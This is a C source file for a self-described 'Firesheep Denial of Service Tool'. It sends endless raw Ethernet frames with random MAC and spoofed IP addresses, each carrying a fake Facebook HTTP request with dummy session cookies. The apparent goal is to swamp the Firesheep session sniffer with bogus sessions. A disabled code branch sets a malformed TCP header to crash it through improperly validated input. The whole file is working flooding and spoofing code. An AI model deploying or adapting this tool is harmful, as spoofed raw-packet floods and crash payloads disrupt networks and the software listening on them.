/* Firesheep Denial of Service Tool
 * TODO:
 *  o use system entropy pool
 *  o only emit valid IP's
 *  o commandline arguments for ip addresses, port list
 *  o more header randomisation
 *  o randomize extra http headers
 *  o randomize sites/cookies
 *  o command-line switch for immediate crash mode
*/
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/time.h>
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <endian.h>
#include <assert.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <net/ethernet.h> /* the L2 protocols */
#include <linux/if_arp.h>
#include <linux/if_ether.h>

static const char *cmd;

/* /dev/random would require furious mouse wiggling */
#undef USE_SYSTEM_RANDOM
#define SYSTEM_RANDOM_SOURCE "/dev/urandom"

#define _packed __attribute__((packed))

struct pkt_ethhdr {
	uint8_t		dst[ETH_ALEN];
	uint8_t		src[ETH_ALEN];
	uint16_t	proto;
} _packed;

/* IPv4 stuffz */
#define IP_CE 		0x8000	/* Congestion */
#define IP_DF 		0x4000	/* dont fragment flag */
#define IP_MF 		0x2000	/* more fragments flag */
#define IP_OFFMASK 	0x1fff	/* mask for fragmenting bits */

struct pkt_iphdr {
	uint8_t		ver_len;
	uint8_t		tos;
	uint16_t 	tot_len;
	uint16_t 	id;
	uint16_t 	frag_off;
	uint8_t		ttl;
	uint8_t		protocol;
	uint16_t 	csum;
	uint32_t 	saddr;
	uint32_t 	daddr;
} _packed;

/* TCP stuffz */
#define TCP_FIN		0x01	/* Finish */
#define TCP_SYN		0x02	/* Synchronise */
#define TCP_RST		0x04	/* Reset */
#define TCP_PSH		0x08	/* Push */
#define TCP_ACK		0x10	/* Acknowlege */
#define TCP_URG		0x20	/* Urgent pointer */
#define TCP_ECE		0x40	/* ECN echo */
#define TCP_CWR		0x80	/* Congestion window reduced */

struct pkt_tcphdr {
	uint16_t	sport,dport;
	uint32_t	seq;
	uint32_t	ack;
	uint8_t		doff;
	uint8_t		flags;
	uint16_t	win;
	uint16_t	csum;
	uint16_t	urp;
} _packed;

/* TCP pseudo-header for checksumming */
struct tcp_phdr {
	uint32_t sip, dip;
	uint8_t zero, proto;
	uint16_t tcp_len;
};

struct pkt {
	struct pkt_ethhdr eth;
	struct pkt_iphdr ip;
	struct pkt_tcphdr tcp;
	uint8_t http[0];
};

struct tx_sock {
	int sock;
	struct sockaddr_ll sll;
	size_t max_http;
	struct pkt *pkt;
};

static const char *err_msg(void)
{
	return strerror(errno);
}

/* Random numbers for modulations of our ev1l p4ck4g3s. */
#if USE_SYSTEM_RANDOM
static uint32_t get_random_bits(unsigned int bits)
{
	assert(bits <= 32);
	abort(); /* not implemented */
}
#else
#define ASSUME_RAND_MAX_BITS ((sizeof(int) << 3) - 1)
static void __attribute__((constructor)) prng_ctor(void)
{
	struct timeval tv;
	assert(RAND_MAX >= (1 << ASSUME_RAND_MAX_BITS));
	gettimeofday(&tv, NULL);
	srand(tv.tv_sec ^ tv.tv_usec ^ getpid());
}

static uint32_t get_random_bits(unsigned int bits)
{
	static unsigned int cached_bits;
	static int rbits;
	uint32_t ret;

	assert(bits <= ASSUME_RAND_MAX_BITS);

	if ( bits > cached_bits ) {
		ret = (rbits & (cached_bits - 1)) << cached_bits;
		bits -= cached_bits;

		rbits = rand();
		cached_bits = ASSUME_RAND_MAX_BITS;
	}else{
		ret = 0;
	}

	ret |= rbits & ((1 << bits) - 1);
	rbits >>= bits;
	cached_bits -= bits;
	return ret;
}
#endif

/* l0l, l3t's ph0rg3 t3h 3th3rn3t |-|e4d3rz t00 w00 */
static struct tx_sock *eth_tx_socket(const char *ifname)
{
	struct tx_sock *tx;
	struct ifreq ifr;
	int ifindex, mtu;
	int s;

	s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if ( s < 0 ) {
		fprintf(stderr, "%s: socket: %s\n", cmd, err_msg());
		goto err;
	}

	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", ifname);
	if ( ioctl(s, SIOCGIFINDEX, &ifr) ) {
		fprintf(stderr, "%s: SIOCGIFINDEX: %s: %s\n",
			cmd, ifname, err_msg());
		goto err_close;
	}
	ifindex = ifr.ifr_ifindex;

	if ( ioctl(s, SIOCGIFMTU, &ifr) ) {
		fprintf(stderr, "%s: SIOCGIFMTU: %s: %s\n",
			cmd, ifname, err_msg());
		goto err_close;
	}
	mtu = ifr.ifr_mtu;

	tx = calloc(1, sizeof(*tx));
	if ( NULL == tx ) {
		fprintf(stderr, "%s: calloc: %s\n", cmd, err_msg());
		goto err_close;
	}

	tx->pkt = calloc(1, mtu);
	if ( NULL == tx ) {
		fprintf(stderr, "%s: calloc: %s\n", cmd, err_msg());
		goto err_free_sock;
	}

	assert(mtu >= 0 && (size_t)mtu > sizeof(*tx->pkt));

	tx->sock = s;
	tx->max_http = mtu - sizeof(*tx->pkt);

	tx->sll.sll_family = AF_PACKET;
	tx->sll.sll_protocol = ETH_P_ALL;
	tx->sll.sll_ifindex = ifindex;
	tx->sll.sll_hatype = ARPHRD_ETHER;
	tx->sll.sll_pkttype = PACKET_OUTGOING;
	tx->sll.sll_halen = ETH_ALEN;
	memset(tx->sll.sll_addr, 0, sizeof(tx->sll.sll_addr));

	printf("%s: ifname=%s ifindex=%d mtu=%d max_http=%d\n", cmd,
		ifr.ifr_name, ifindex, mtu, tx->max_http);

	return tx;

err_free_sock:
	free(tx);
err_close:
	close(s);
err:
	return NULL;
}

/* c0rr3kt (h3cksu/\/\s s0 w3 4r3 n0+ s0 3a5i1y |)et3ct0rd */
static uint16_t ip_csum(const struct pkt_iphdr *iph)
{
	uint16_t *tmp = (uint16_t *)iph;
	uint32_t sum = 0;
	unsigned int i;

	for(i=0; i < sizeof(*iph) >> 1; i++) {
		sum += tmp[i];
		if(sum & 0x80000000)
			sum = (sum & 0xffff) + (sum >> 16);
	}

	while(sum >> 16)
		sum = (sum & 0xffff) + (sum >> 16);

	return ~sum & 0xffff;
}

static inline uint16_t tcp_csum(struct pkt *pkt)
{
	struct tcp_phdr ph;
	uint16_t *tmp;
	uint32_t sum = 0;
	uint16_t len;
	int i;

	len = ntohs(pkt->ip.tot_len) - sizeof(pkt->ip);

	/* Make pseudo-header */
	ph.sip = pkt->ip.saddr;
	ph.dip = pkt->ip.daddr;
	ph.zero = 0;
	ph.proto = pkt->ip.protocol;
	ph.tcp_len = ntohs(len);

	/* Checksum the pseudo-header */
	tmp = (uint16_t *)&ph;
	for(i = 0; i < 6; i++)
		sum += tmp[i];

	/* Checksum the header+data */
	tmp = (uint16_t *)&pkt->tcp;
	for(i = 0; i < (len >> 1); i++)
		sum += tmp[i];

	/* Deal with last byte (if odd number of bytes) */
	if ( len & 1 ) {
		union {
			uint8_t b[2];
			uint16_t s;
		}f;

		f.b[0] = ((uint8_t *)&pkt->tcp)[len - 1];
		f.b[1] = 0;
		sum += f.s;
	}

	sum = (sum & 0xffff) + (sum >> 16);

	return (~sum & 0xffff);
}

static size_t new_pkt(struct tx_sock *tx)
{
	unsigned int i;
	size_t http_len, sz;
	static const char * const req =
		"GET / HTTP/1.1\r\n"
		"Host: www.facebook.com\r\n"
		"Connection: keep-alive\r\n"
		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n"
		"User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Ubuntu/10.04 Chromium/7.0.517.41 Chrome/7.0.517.41 Safari/534.7\r\n"
		"Accept-Encoding: gzip,deflate,sdch\r\n"
		"Accept-Language: en-US,en;q=0.8,en-GB;q=0.6\r\n"
		"Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n"
		"Cookie: c_user=0000000000; datr=aaaaaa_aaaaaa-9aaaaaaaaa; lu=aaaaaaaaaaaaaaaaaaaaaaaa; sct=1111111111; sid=1; xs=11111111111111111111111111111111; presence=AB1111111111aaaaaa_1111.channelA1A111111111111111111111111111111111111111111111111111111_1111111111111111111111111111111111111111111111111111111111.11111111111111111; noscript=1;\r\n"
		"\r\n";

	http_len = snprintf((char *)&tx->pkt->http, tx->max_http, "%s", req);
	sz = sizeof(tx->pkt->ip) + 
		sizeof(tx->pkt->tcp) + http_len;

	for(i = 0; i < ETH_ALEN; i++)
		tx->pkt->eth.src[i] = get_random_bits(8);
	for(i = 0; i < ETH_ALEN; i++)
		tx->pkt->eth.dst[i] = get_random_bits(8);
	tx->pkt->eth.proto = htons(ETH_P_IP);

	tx->pkt->ip.ver_len = 0x45;
	tx->pkt->ip.ttl = 0xff;
	tx->pkt->ip.frag_off = htons(IP_DF);
	tx->pkt->ip.protocol = IPPROTO_TCP;
	tx->pkt->ip.saddr = (get_random_bits(16) << 16) | get_random_bits(16);
	tx->pkt->ip.daddr = (get_random_bits(16) << 16) | get_random_bits(16);
	tx->pkt->ip.tot_len = htons(sz);
	tx->pkt->ip.csum = 0;
	tx->pkt->ip.csum = ip_csum(&tx->pkt->ip);

	tx->pkt->tcp.seq = (get_random_bits(16) << 16) | get_random_bits(16);
	tx->pkt->tcp.ack = (get_random_bits(16) << 16) | get_random_bits(16);
	tx->pkt->tcp.win = get_random_bits(16);
	tx->pkt->tcp.dport = htons(80);
	tx->pkt->tcp.sport = get_random_bits(16);
	tx->pkt->tcp.flags = TCP_ACK | TCP_PSH;
#if 1
	tx->pkt->tcp.doff = (0x5 << 4);
#else
	/* Cause firesheep to exit due to improperly validated input */
	tx->pkt->tcp.doff = (0x5 << 4) - 1;
#endif
	tx->pkt->tcp.csum = 0;
	tx->pkt->tcp.csum = tcp_csum(tx->pkt);

	return sizeof(tx->pkt->eth) + sz;
}

/* From knuth, vol 2 seminumerical methods, chaps 6, para 5  */
int main(int argc, char **argv)
{
	struct tx_sock *tx;

	assert(argc >= 1);
	cmd = argv[0];

	// tx = eth_tx_socket("wlan0");
	tx = eth_tx_socket("eth0");
	if ( NULL == tx )
		return EXIT_FAILURE;

	for(;;) {
		size_t sz;

		sz = new_pkt(tx);
		sendto(tx->sock, tx->pkt, sz, MSG_NOSIGNAL,
			(struct sockaddr *)&tx->sll, sizeof(tx->sll));
		usleep(get_random_bits(17));
	}

	return EXIT_SUCCESS;
}
